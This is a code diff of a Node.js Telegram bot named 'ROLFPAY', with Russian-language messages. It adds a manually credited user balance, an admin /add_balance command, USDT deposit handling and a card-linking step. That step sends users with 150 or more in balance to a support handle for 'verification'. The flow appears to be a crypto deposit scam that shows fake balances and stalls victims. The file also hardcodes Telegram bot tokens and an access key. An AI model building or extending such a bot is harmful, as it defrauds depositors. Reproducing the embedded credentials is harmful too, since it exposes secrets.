@@ -1,6 +1,6 @@
 require("dotenv").config();
 
-const API_KEY_BOT = '7597739965:AAGS-ehdbbtODxQ0x3IZz-Ba-L017aRNq8M';
+const API_KEY_BOT = '7343499202:AAEMbpNBudNwOU7D_slvIE6TyQMw5kQTSa0';
 const ACCESS_KEY = 'AAFyizvudiwAchMfaXBJsZRA9e8QEoPwttM2';
 const ADMIN_CHAT_ID = '7452921982';
 const TelegramBot = require('node-telegram-bot-api');
@@ -19,8 +19,9 @@ bot.on('message', msg => {
             hasAccess: false,
             msgAddCardId: null,
             currency: 'USD', // default currency
-            isDepositing: false // состояние для отслеживания процесса пополнения 
-    };
+            isDepositing: false, // состояние для отслеживания процесса пополнения 
+            balance: 0 // добавляем баланс
+        };
 
         // Send notification to admin about new user 
         const adminChatId = ADMIN_CHAT_ID;
@@ -65,8 +66,25 @@ bot.on('message', msg => {
             });
             users[chatId].isDepositing = false; // Сбрасываем состояние после обработки 
         }
-    } else if (msg.text !== '/start') {
-        bot.sendMessage(chatId, 'Пожалуйста, выберите действие из меню или введите команду.');
+    } 
+});
+
+// Обработка команд администратора
+bot.onText(/\/add_balance (\d+) (\d+)/, (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = match[1]; // ID пользователя
+    const amount = parseFloat(match[2]); // Сумма
+
+    if (chatId.toString() === ADMIN_CHAT_ID) {
+        if (users[userId]) {
+            users[userId].balance += amount; // Увеличиваем баланс
+            bot.sendMessage(userId, `Ваш баланс был увеличен на ${amount}. Новый баланс: ${users[userId].balance}`);
+            bot.sendMessage(chatId, `Баланс пользователя ${userId} был увеличен на ${amount}.`);
+        } else {
+            bot.sendMessage(chatId, `Пользователь с ID ${userId} не найден.`);
+        }
+    } else {
+        bot.sendMessage(chatId, 'У вас нет прав для выполнения этой команды.');
     }
 });
 
@@ -81,16 +99,23 @@ bot.on('callback_query', query => {
         bot.deleteMessage(chatId, query.message.message_id);
         showMenu(chatId);
     } else if (query.data === 'add_card') {
-        const msgAddCard = bot.sendMessage(chatId, 'Привязка карт недоступна, внесите депозит.', {
+        if (users[chatId].balance >= 150) {  
+            bot.sendMessage(chatId, `Ваш аккаунт помечен неверифицированным. \nОтпишите саппорту для верификации: @garantROLFPAY`, {
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: `🏠 Меню`, callback_data: 'menu' }]
+                    ]
+                }
+            })
+        }else { 
+            bot.sendMessage(chatId, 'Привязка карт недоступна, внесите депозит.', {
             reply_markup: {
                 inline_keyboard: [
                     [{ text: `🏠 Меню`, callback_data: 'menu' }]
                 ]
             }
-        });
-        msgAddCard.then(sentMessage => {
-            users[chatId].msgAddCardId = sentMessage.message_id;
-        });
+        })
+        }
     } else if (query.data === 'deposit') {
         users[chatId].isDepositing = true; // Устанавливаем состояние пополнения 
         bot.sendMessage(chatId, 'Введите сумму депозита в USD:');
@@ -105,17 +130,6 @@ bot.on('callback_query', query => {
     } else if (query.data === 'dollars' || query.data === 'rubles' || query.data === 'grivnes') {
         users[chatId].currency = query.data;
         showMenu(chatId);
-    } else if (query.data === 'options') {
-        bot.sendMessage(chatId, `Выберите валюту:`, {
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: '$', callback_data: 'dollars' }],
-                    [{ text: '₽', callback_data: 'rubles' }],
-                    [{ text: '₴', callback_data: 'grivnes' }]
-                ]
-            }
-        });
-        bot.deleteMessage(chatId, query.message.message_id);
     } else if (query.data === 'deposit_accept') {
         const adminChatId = ADMIN_CHAT_ID;
         const depositAmount = parseFloat(query.message.text.split('Отправьте USDT на сумму: ')[1].split(' USDT')[0]);
@@ -131,13 +145,21 @@ bot.on('callback_query', query => {
 });
 
 function showMenu(chatId) {
-    bot.sendMessage(chatId, 'Выберите действие:', {
+    const menuMessage = `
+    ROLFPAY 
+
+Добрый день!
+
+Ваш баланс: ${users[chatId].balance}$
+Ваши сделки: 0 
+Ваши карты: 0 
+    `;
+    bot.sendMessage(chatId, menuMessage, {
         reply_markup: {
             inline_keyboard: [
                 [{ text: '💰 Пополнить Баланс', callback_data: 'deposit' }],
                 [{ text: '📊 Мои Сделки', callback_data: 'my_deals' }],
-                [{ text: '💳 Привязка карт', callback_data: 'add_card' }],
-                [{ text: '⚙️ Настройки', callback_data: 'options' }]
+                [{ text: '💳 Привязка карт', callback_data: 'add_card' }]
             ]
         }
     });
